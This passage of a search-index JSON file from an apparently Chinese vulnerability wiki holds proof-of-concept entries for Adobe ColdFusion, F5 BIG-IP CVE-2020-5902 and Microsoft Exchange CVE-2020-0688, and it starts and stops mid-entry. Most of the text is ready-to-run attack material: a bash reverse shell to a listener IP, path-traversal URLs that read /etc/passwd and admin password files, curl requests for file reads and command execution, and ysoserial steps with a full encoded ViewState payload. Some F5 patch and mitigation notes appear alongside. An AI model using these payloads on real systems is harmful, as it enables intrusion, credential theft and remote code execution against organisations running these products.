1","title":"\u683c\u5f0f"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#_7","text":"\u6bd4\u5982\u76d1\u542c192.168.236.138\u7684333\u7aef\u53e3 bash -i >& /dev/tcp/192.168.236.138/333 0>&1","title":"\u4f8b\u5b50"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/","text":"Adobe ColdFusion \u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e \u00b6 \u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-21 13:01:58 \u6f0f\u6d1e\u8303\u56f4 \u00b6 Adobe ColdFusion 8\u30019 \u6f0f\u6d1ePOC \u00b6 \u8bfb\u53d6etc/passwd http://your-ip:8500/CFIDE/administrator/enter.cfm?locale = ../../../../../../../../../../etc/passwd%00en \u8bfb\u53d6\u540e\u53f0\u7ba1\u7406\u5458\u5bc6\u7801 http://your-ip:8500/CFIDE/administrator/enter.cfm?locale = ../../../../../../../lib/password.properties%00en","title":"Adobe ColdFusion \u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#adobe-coldfusion","text":"\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-21 13:01:58","title":"Adobe ColdFusion \u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#_1","text":"Adobe ColdFusion 8\u30019","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#poc","text":"\u8bfb\u53d6etc/passwd http://your-ip:8500/CFIDE/administrator/enter.cfm?locale = ../../../../../../../../../../etc/passwd%00en \u8bfb\u53d6\u540e\u53f0\u7ba1\u7406\u5458\u5bc6\u7801 http://your-ip:8500/CFIDE/administrator/enter.cfm?locale = ../../../../../../../lib/password.properties%00en","title":"\u6f0f\u6d1ePOC"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/F5/CVE-2020-5902/","text":"\u6f0f\u6d1e\u7f16\u53f7 \u00b6 CVE-2020-5902 \u5f71\u54cd\u7248\u672c \u00b6 BIG-IP 15.x: 15.1.0/15.0.0 BIG-IP 14.x: 14.1.0 ~ 14.1.2 BIG-IP 13.x: 13.1.0 ~ 13.1.3 BIG-IP 12.x: 12.1.0 ~ 12.1.5 BIG-IP 11.x: 11.6.1 ~ 11.6.5 \u901a\u7528\u4fee\u8865\u5efa\u8bae \u00b6 \u5347\u7ea7\u5230\u4ee5\u4e0b\u7248\u672c BIG-IP 15.x: 15.1.0.4 BIG-IP 14.x: 14.1.2.6 BIG-IP 13.x: 13.1.3.4 BIG-IP 12.x: 12.1.5.2 BIG-IP 11.x: 11.6.5.2 \u4e34\u65f6\u4fee\u8865\u5efa\u8bae \u00b6 \u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u767b\u5f55\u5bf9\u5e94\u7cfb\u7edf tmsh \u7f16\u8f91 httpd \u7ec4\u4ef6\u7684\u914d\u7f6e\u6587\u4ef6 edit /sys httpd all-properties \u6587\u4ef6\u5185\u5bb9\u5982\u4e0b include ' Redirect 404 / ' \u6309\u7167\u5982\u4e0b\u64cd\u4f5c\u4fdd\u5b58\u6587\u4ef6 \u6309\u4e0b ESC \u5e76\u4f9d\u6b21\u8f93\u5165 :wq \u6267\u884c\u547d\u4ee4\u5237\u65b0\u914d\u7f6e\u6587\u4ef6 save /sys config \u91cd\u542f httpd \u670d\u52a1 restart sys service httpd \u5e76\u7981\u6b62\u5916\u90e8IP\u5bf9 TMUI \u9875\u9762\u7684\u8bbf\u95ee \u6587\u4ef6\u8bfb\u53d6 \u00b6 curl -v -k 'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd' https:// /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd https:// /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license https:// /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts https:// /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c \u00b6 curl -v -k 'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'","title":"CVE 2020 5902"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/F5/CVE-2020-5902/#_1","text":"CVE-2020-5902","title":"\u6f0f\u6d1e\u7f16\u53f7"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/F5/CVE-2020-5902/#_2","text":"BIG-IP 15.x: 15.1.0/15.0.0 BIG-IP 14.x: 14.1.0 ~ 14.1.2 BIG-IP 13.x: 13.1.0 ~ 13.1.3 BIG-IP 12.x: 12.1.0 ~ 12.1.5 BIG-IP 11.x: 11.6.1 ~ 11.6.5","title":"\u5f71\u54cd\u7248\u672c"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/F5/CVE-2020-5902/#_3","text":"\u5347\u7ea7\u5230\u4ee5\u4e0b\u7248\u672c BIG-IP 15.x: 15.1.0.4 BIG-IP 14.x: 14.1.2.6 BIG-IP 13.x: 13.1.3.4 BIG-IP 12.x: 12.1.5.2 BIG-IP 11.x: 11.6.5.2","title":"\u901a\u7528\u4fee\u8865\u5efa\u8bae"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/F5/CVE-2020-5902/#_4","text":"\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u767b\u5f55\u5bf9\u5e94\u7cfb\u7edf tmsh \u7f16\u8f91 httpd \u7ec4\u4ef6\u7684\u914d\u7f6e\u6587\u4ef6 edit /sys httpd all-properties \u6587\u4ef6\u5185\u5bb9\u5982\u4e0b include ' Redirect 404 / ' \u6309\u7167\u5982\u4e0b\u64cd\u4f5c\u4fdd\u5b58\u6587\u4ef6 \u6309\u4e0b ESC \u5e76\u4f9d\u6b21\u8f93\u5165 :wq \u6267\u884c\u547d\u4ee4\u5237\u65b0\u914d\u7f6e\u6587\u4ef6 save /sys config \u91cd\u542f httpd \u670d\u52a1 restart sys service httpd \u5e76\u7981\u6b62\u5916\u90e8IP\u5bf9 TMUI \u9875\u9762\u7684\u8bbf\u95ee","title":"\u4e34\u65f6\u4fee\u8865\u5efa\u8bae"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/F5/CVE-2020-5902/#_5","text":"curl -v -k 'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd' https:// /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd https:// /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license https:// /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts https:// /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf","title":"\u6587\u4ef6\u8bfb\u53d6"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/F5/CVE-2020-5902/#_6","text":"curl -v -k 'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'","title":"\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Exchange%20Server/CVE-2020-0688%20Microsoft%20Exchange%20Server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"CVE-2020-0688_\u5fae\u8f6fEXCHANGE\u670d\u52a1\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6f0f\u6d1e\u7f16\u53f7 \uff1aCVE-2020-0688 \u6f0f\u6d1e\u63cf\u8ff0 \uff1a\u653b\u51fb\u8005\u5411\u5b58\u5728\u7f3a\u9677\u7684Exchange\u670d\u52a1\u5668\u53d1\u9001\u7ecf\u8fc7\u7279\u6b8a\u5904\u7406\u7684\u7535\u5b50\u90ae\u4ef6\u5373\u53ef\u89e6\u53d1\u6f0f\u6d1e\u3002\u8fd9\u4e2a\u6f0f\u6d1e\u662f\u7531\u4e8eExchange\u670d\u52a1\u5668\u5728\u5b89\u88c5\u65f6\u6ca1\u6709\u6b63\u786e\u5730\u521b\u5efa\u552f\u4e00\u7684\u52a0\u5bc6\u5bc6\u94a5\u6240\u9020\u6210\u7684\u3002 \u5177\u4f53\u6765\u8bf4\uff0c\u4e0e\u6bcf\u6b21\u8f6f\u4ef6\u5b89\u88c5\u90fd\u4f1a\u4ea7\u751f\u968f\u673a\u5bc6\u94a5\u4e0d\u540c\uff0c\u6240\u6709Exchange Server\u5728\u5b89\u88c5\u540e\u7684web.config\u6587\u4ef6\u4e2d\u90fd\u62e5\u6709**\u76f8\u540c\u7684validationKey\u548cdecryptionKey**\u3002\u8fd9\u4e9b\u5bc6\u94a5\u7528\u4e8e\u4fdd\u8bc1ViewState\u7684\u5b89\u5168\u6027\u3002\u800cViewState\u662fASP.NET Web\u5e94\u7528\u4ee5\u5e8f\u5217\u5316\u683c\u5f0f\u5b58\u50a8\u5728\u5ba2\u6237\u673a\u4e0a\u7684\u670d\u52a1\u7aef\u6570\u636e\u3002\u5ba2\u6237\u7aef\u901a\u8fc7__VIEWSTATE\u8bf7\u6c42\u53c2\u6570\u5c06\u8fd9\u4e9b\u6570\u636e\u8fd4\u56de\u7ed9\u670d\u52a1\u5668\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728Exchange Control Panel web\u5e94\u7528\u4e0a\u6267\u884c\u4efb\u610f.net\u4ee3\u7801\u3002 \u5f71\u54cd\u7248\u672c \uff1aexchange 2010\u30012013\u30012016\u30012019\u5168\u7248\u672c\u901a\u6740\u3002 \u6f0f\u6d1e\u590d\u73b0\uff1a \u590d\u73b0\u73af\u5883\uff1aserver 12 + exchange 2013 15.0.516.32\uff082012 \u5e7412\u67083\u65e5\uff09\u548c15.0.1497.2\uff082019\u5e746\u670818\u65e5\uff09\u4e24\u7248\u3002 \u590d\u73b0\u8fc7\u7a0b\uff1a 1\u3001\u83b7\u53d6ViewStateUserKey\u503c /ecp/default.aspx F12\u952e\u6253\u5f00\u5f00\u53d1\u5de5\u5177\u7684Network\u9009\u9879\uff0c\u7136\u540e\u6309F5\u91cd\u65b0\u53d1\u9001\u8bf7\u6c42\u3002\u6211\u4eec\u9700\u8981\u627e\u5230\u767b\u5f55\u65f6 /ecp/default.aspx \u7684\u539f\u59cb\u54cd\u5e94\uff1a 2\u3001\u83b7\u53d6\u53d6__VIEWSTATEGENERATOR\u503c\uff1a \u540c\u6837\u5728/ecp/default.aspx\u7684\u54cd\u5e94\u5305\u5185\uff0c\u76f4\u63a5\u641c\u7d22\u5173\u952e\u8bcd\u5373\u53ef\u3002 \u6216\u4f7f\u7528document.getElementById(\"__VIEWSTATEGENERATOR\").value \u5982\u679c\u53d1\u73b0\u6ca1\u6709\u6539\u5b57\u6bb5\uff0c\u662f\u56e0\u4e3a\u7cfb\u7edf\u6ca1\u6709\u5b89\u88c5KB2919355\u8865\u4e01\uff0c\u66f4\u65b0\u8be5\u8865\u4e01\u540e\u53ef\u663e\u793a\uff0c\u4f46\u662f\u8be5\u5b57\u6bb5\u503c\u57fa\u672c\u552f\u4e00\uff0c\u4e0d\u9700\u8981\u523b\u610f\u83b7\u5f97\u3002 3.\u6574\u7406\u5df2\u77e5\u53c2\u6570 --validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF**\uff08\u9ed8\u8ba4\uff0c\u6f0f\u6d1e\u4ea7\u751f\u539f\u56e0\uff09** --validationalg = SHA1**\uff08\u9ed8\u8ba4\uff0c\u6f0f\u6d1e\u4ea7\u751f\u539f\u56e0\uff09** --generator = B97B4E27**\uff08\u57fa\u672c\u9ed8\u8ba4\uff09** --viewstateuserkey = d673d1a4-1794-403e-ab96-e283ca880ef2**\uff08\u624b\u5de5\u83b7\u53d6\uff0c\u53d8\u91cf\uff0c\u6bcf\u6b21\u767b\u9646\u90fd\u4e0d\u4e00\u81f4\uff09** 4.\u751f\u6210payload: .\\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"calc.exe\" --validationalg=\"SHA1\" --validationkey=\"CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF\" --generator=\"B97B4E27\" --viewstateuserkey=\"d673d1a4-1794-403e-ab96-e283ca880ef2\" --isdebug --islegacy 5.\u4e0a\u9762ysoserial.exe\u751f\u6210\u7684payload\u8981\u7528URL Encode\u7f16\u7801\uff1a 6.\u5b8c\u6574\u7684\u653b\u51fb\u5730\u5740\u793a\u4f8b\uff1a https://192.168.1.248/ecp/default.aspx?__VIEWSTATEGENERATOR= B97B4E27 &__VIEWSTATE=%2FwEyhAYAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAACmBDxSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI%2BDQoJIDxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IiIgT2JqZWN0VHlwZSA9ICJ7IHg6VHlwZSBEaWFnOlByb2Nlc3N9IiBNZXRob2ROYW1lID0gIlN0YXJ0IiA%2BDQogICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgPFN5c3RlbTpTdHJpbmc%2BY2FsYy5leGU8L1N5c3RlbTpTdHJpbmc%2BDQogICAgIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM%2BDQogICAgPC9PYmplY3REYXRhUHJvdmlkZXI%2BDQo8L1Jlc291cmNlRGljdGlvbmFyeT4Lp73ado0NJN2PSSnfOoN9h4H7xCU%3D 7.\u6210\u529f\u5f39\u51fa\u8ba1\u7b97\u5668\uff1a //ysoserial.exe\u4e0b\u8f7d\uff1a https://github.com/pwntester/ysoserial.net https://github.com/Jumbo-WJB/CVE-2020-0688 https://github.com/random-robbie/cve-2020-0688 //Exchange\u7248\u672c\u548c\u5404\u66f4\u65b0\u5305\u4e0b\u8f7d\uff1a https://docs.microsoft.com/zh-cn/Exchange/new-features/build-numbers-and-release-dates?view=exchserver-2016 8.\u65e0\u6cd5\u521b\u5efa\u6587\u4ef6 \u65e0\u6cd5\u521b\u5efa\u6587\u4ef6\u8fd9\u4e00\u70b9\u5176\u5b9e\u6700\u5751\u4e86\uff0c\u660e\u660e\u53ef\u4ee5\u542f\u52a8calc.exe\u4f46\u662f\u5c31\u662f\u4e0d\u80fd\u521b\u5efa\u6587\u4ef6\uff0c\u5bfc\u81f4\u6211\u6700\u521d\u4e00\u76f4\u4ee5\u4e3a\u662f\u7248\u672c\u95ee\u9898\u6216\u8005__VIEWSTATEGENERATOR\u53c2\u6570\u95ee\u9898\u3002\u4f46\u662f\u540e\u6765\u7ecf\u8fc7\u6d4b\u8bd5\u53d1\u73b0\u867d\u7136\u5728\u6f14\u793a\u8fc7\u7a0b\u4e2d\u76f4\u63a5-c \"echo OOOPS!!! > c:/Vuln_Server.txt\"\u521b\u5efa\u6587\u4ef6\uff0c\u8ba9\u4eba\u8bef\u4ee5\u4e3a-c\u662f\u5728cmd\u7a97\u53e3\u4e0b\u8fd0\u884c\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a-c\u5b9e\u9645\u4e3a\u201c\u8fd0\u884c\u201d\u7684\u5185\u5bb9\uff0c\u56e0\u6b64\u76f4\u63a5echo\u662f\u4e0d\u884c\u7684\uff0c\u9700\u8981-c \"cmd /c echo test > C:\\1.txt\"\u8fd9\u6837\u521b\u5efa\u3002","title":"CVE-2020-0688_\u5fae\u8f6fEXCHANGE\u670d\u52a1\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Exchange%20Server/CVE-2020-0688%20Microsoft%20Exchange%20Server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#cve-2020-0688_exchange","text":"\u6f0f\u6d1e\u7f16\u53f7 \uff1aCVE-2020-0688 \u6f0f\u6d1e\u63cf\u8ff0 \uff1a\u653b\u51fb\u8005\u5411\u5b58\u5728\u7f3a\u9677\u7684Exchange\u670d\u52a1\u5668\u53d1\u9001\u7ecf\u8fc7\u7279\u6b8a\u5904\u7406\u7684\u7535\u5b50\u90ae\u4ef6\u5373\u53ef\u89e6\u53d1\u6f0f\u6d1e\u3002\u8fd9\u4e2a\u6f0f\u6d1e\u662f\u7531\u4e8eExchange\u670d\u52a1\u5668\u5728\u5b89\u88c5\u65f6\u6ca1\u6709\u6b63\u786e\u5730\u521b\u5efa\u552f\u4e00\u7684\u52a0\u5bc6\u5bc6\u94a5\u6240\u9020\u6210\u7684\u3002 \u5177\u4f53\u6765\u8bf4\uff0c\u4e0e\u6bcf\u6b21\u8f6f\u4ef6\u5b89\u88c5\u90fd\u4f1a\u4ea7\u751f\u968f\u673a\u5bc6\u94a5\u4e0d\u540c\uff0c\u6240\u6709Exchange Server\u5728\u5b89\u88c5\u540e\u7684web.config\u6587\u4ef6\u4e2d\u90fd\u62e5\u6709**\u76f8\u540c\u7684validationKey\u548cdecryptionKey**\u3002\u8fd9\u4e9b\u5bc6\u94a5\u7528\u4e8e\u4fdd\u8bc1ViewState\u7684\u5b89\u5168\u6027\u3002\u800cViewState\u662fASP.NET Web\u5e94\u7528\u4ee5\u5e8f\u5217\u5316\u683c\u5f0f\u5b58\u50a8\u5728\u5ba2\u6237\u673a\u4e0a\u7684\u670d\u52a1\u7aef\u6570\u636e\u3002\u5ba2\u6237\u7aef\u901a\u8fc7__VIEWSTATE\u8bf7\u6c42\u53c2\u6570\u5c06\u8fd9\u4e9b\u6570\u636e\u8fd4\u56de\u7ed9\u670d\u52a1\u5668\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728Exchange Control Panel web\u5e94\u7528\u4e0a\u6267\u884c\u4efb\u610f.net\u4ee3\u7801\u3002 \u5f71\u54cd\u7248\u672c \uff1aexchange 2010\u30012013\u30012016\u30012019\u5168\u7248\u672c\u901a\u6740\u3002 \u6f0f\u6d1e\u590d\u73b0\uff1a \u590d\u73b0\u73af\u5883\uff1aserver 12 + exchange 2013 15.0.516.32\uff082012 \u5e7412\u67083\u65e5\uff09\u548c15.0.1497.2\uff082019\u5e746\u670818\u65e5\uff09\u4e24\u7248\u3002 \u590d\u73b0\u8fc7\u7a0b\uff1a 1\u3001\u83b7\u53d6ViewStateUserKey\u503c /ecp/default.aspx F12\u952e\u6253\u5f00\u5f00\u53d1\u5de5\u5177\u7684Network\u9009\u9879\uff0c\u7136\u540e\u6309F5\u91cd\u65b0\u53d1\u9001\u8bf7\u6c42\u3002\u6211\u4eec\u9700\u8981\u627e\u5230\u767b\u5f55\u65f6 /ecp/default.aspx \u7684\u539f\u59cb\u54cd\u5e94\uff1a 2\u3001\u83b7\u53d6\u53d6__VIEWSTATEGENERATOR\u503c\uff1a \u540c\u6837\u5728/ecp/default.aspx\u7684\u54cd\u5e94\u5305\u5185\uff0c\u76f4\u63a5\u641c\u7d22\u5173\u952e\u8bcd\u5373\u53ef\u3002 \u6216\u4f7f\u7528document.getElementById(\"__VIEWSTATEGENERATOR\").value \u5982\u679c\u53d1\u73b0\u6ca1\u6709\u6539\u5b57\u6bb5\uff0c\u662f\u56e0\u4e3a\u7cfb\u7edf\u6ca1\u6709\u5b89\u88c5KB2919355\u8865\u4e01\uff0c\u66f4\u65b0\u8be5\u8865\u4e01\u540e\u53ef\u663e\u793a\uff0c\u4f46\u662f\u8be5\u5b57\u6bb5\u503c\u57fa\u672c\u552f\u4e00\uff0c\u4e0d\u9700\u8981\u523b\u610f\u83b7\u5f97\u3002 3.\u6574\u7406\u5df2\u77e5\u53c2\u6570 --validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF**\uff08\u9ed8\u8ba4\uff0c\u6f0f\u6d1e\u4ea7\u751f\u539f\u56e0\uff09** --validationalg = SHA1**\uff08\u9ed8\u8ba4\uff0c\u6f0f\u6d1e\u4ea7\u751f\u539f\u56e0\uff09** --generator = B97B4E27**\uff08\u57fa\u672c\u9ed8\u8ba4\uff09** --viewstateuserkey = d673d1a4-1794-403e-ab96-e283ca880ef2**\uff08\u624b\u5de5\u83b7\u53d6\uff0c\u53d8\u91cf\uff0c\u6bcf\u6b21\u767b\u9646\u90fd\u4e0d\u4e00\u81f4\uff09** 4.\u751f\u6210payload: .\\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"calc.exe\" --validationalg=\"SHA1\" --validationkey=\"CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF\" --generator=\"B97B4E27\" --viewstateuserkey=\"d673d1a4-1794-403e-ab96-e283ca880ef2\" --isdebug --islegacy 5.\u4e0a\u9762ysoserial.exe\u751f\u6210\u7684payload\u8981\u7528URL Encode\u7f16\u7801\uff1a 6.\u5b8c\u6574\u7684\u653b\u51fb\u5730\u5740\u793a\u4f8b\uff1a https://192.168.1.248/ecp/default.aspx?__VIEWSTATEGENERATOR= B97B4E27 &__VIEWSTATE=%2FwEyhAYAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAACmBDxSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI%2BDQoJIDxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IiIgT2JqZWN0VHlwZSA9ICJ7IHg6VHlwZSBEaWFnOlByb2Nlc3N9IiBNZXRob2ROYW1lID0gIlN0YXJ0IiA%2BDQogICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgPFN5c3RlbTpTdHJpbmc%2BY2FsYy5leGU8L1N5c3RlbTpTdHJpbmc%2BDQogICAgIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM%2BDQogICAgPC9PYmplY3REYXRhUHJvdmlkZXI%2BDQo8L1Jlc291cmNlRGljdGlvbmFyeT4Lp73ado0NJN2PSSnfOoN9h4H7xCU%3D 7.\u6210\u529f\u5f39\u51fa\u8ba1\u7b97\u5668\uff1a //ysoserial.exe\u4e0b\u8f7d\uff1a https://github.com/pwntester/ysoserial.net https://github.com/Jumbo-WJB/CVE-2020-0688 https://github.com/random-robbie/cve-2020-0688 //Exchange\u7248\u672c\u548c\u5404\u66f4\u65b0\u5305\u4e0b\u8f7d\uff1a https://docs.microsoft.com/zh-cn/Exchange/new-features/build-numbers-and-release-dates?view=exchserver-2016 8.\u65e0\u6cd5\u521b\u5efa\u6587\u4ef6 \u65e0\u6cd5\u521b\u5efa\u6587\u4ef6\u8fd9\u4e00\u70b9\u5176\u5b9e\u6700\u5751\u4e86\uff0c\u660e\u660e\u53ef\u4ee5\u542f\u52a8calc.exe\u4f46\u662f\u5c31\u662f\u4e0d\u80fd\u521b\u5efa\u6587\u4ef6\uff0c\u5bfc\u81f4\u6211\u6700\u521d\u4e00\u76f4\u4ee5\u4e3a\u662f\u7248\u672c\u95ee\u9898\u6216\u8005__VIEWSTATEGENERATOR\u53c2\u6570\u95ee\u9898\u3002\u4f46\u662f\u540e\u6765\u7ecf\u8fc7\u6d4b\u8bd5\u53d1\u73b0\u867d\u7136\u5728\u6f14\u793a\u8fc7\u7a0b\u4e2d\u76f4\u63a5-c \"echo OOOPS!!! > c:/Vuln_Server.txt\"\u521b\u5efa\u6587\u4ef6\uff0c\u8ba9\u4eba\u8bef\u4ee5\u4e3a-c\u662f\u5728cmd\u7a97\u53e3\u4e0b\u8fd0\u884c\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a-c\u5b9e\u9645\u4e3a\u201c\u8fd0\u884c\u201d\u7684\u5185\u5bb9\uff0c\u56e0\u6b64\u76f4\u63a5echo\u662f\u4e0d\u884c\u7684\uff0c\u9700\u8981-c \"cmd /c echo test > C:\\1.txt\"\u8fd9\u6837\u521b\u5efa\u3002","title":"CVE-2020-0688_\u5fae\u8f6fEXCHANGE\u670d\u52a1\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Exchange%20Server/CVE-2020-17083%20Microsoft%20Exchange%20Server%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20POC/","text":"CVE-2020-17083 Microsoft Exchange Server\u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e POC \u00b6 \u7b80\u4ecb \u00b6 CVE-2020-17083\u662f\u5b58\u5728\u4e8eMicrosoft Exchange\u670d\u52a1\u5668\u4e2d\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002 CVE-2020-17083 CVSS:3.0 5.5/4.8CVSS:3.0/AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:L/E:U/RL:O/RC:C \u5229\u7528\u65b9\u5f0f \u00b6 \u6ce8\u610f\uff0c\u9700\u8981Exchange Server Certificates\u89d2\u8272\uff0c\u4f8b\u5982\u4e0b\u9762\u7684\u7528\u6237 harryh\uff0c\u67e5\u770bexchange\u670d\u52a1\u5668\u4e2d\u5173\u4e8eharryh\u7528\u6237\u7684\u4fe1\u606f [PS] C:\\Windows\\system32>New-RoleGroup -Name \"cert users\" -Roles \"Exchange Server Certificates\" -Members \"harryh\" Name AssignedRoles RoleAssignments ManagedBy ---- ------------- --------------- --------- cert users {Exchange Server Certificates} {Exchange Server Certificates-cert users} {exchangedemo.com/Microsoft Exchange Security Groups/Organization Management, exchangedemo.com/Users/Admin} [PS] C:\\Windows\\system32>Get-RoleGroup \"cert users\" | Format-List RunspaceId : a97d7e2c-d036-4bfc-b95c-4fabcb644160 ManagedBy : {exchangedemo.com/Microsoft Exchange Security 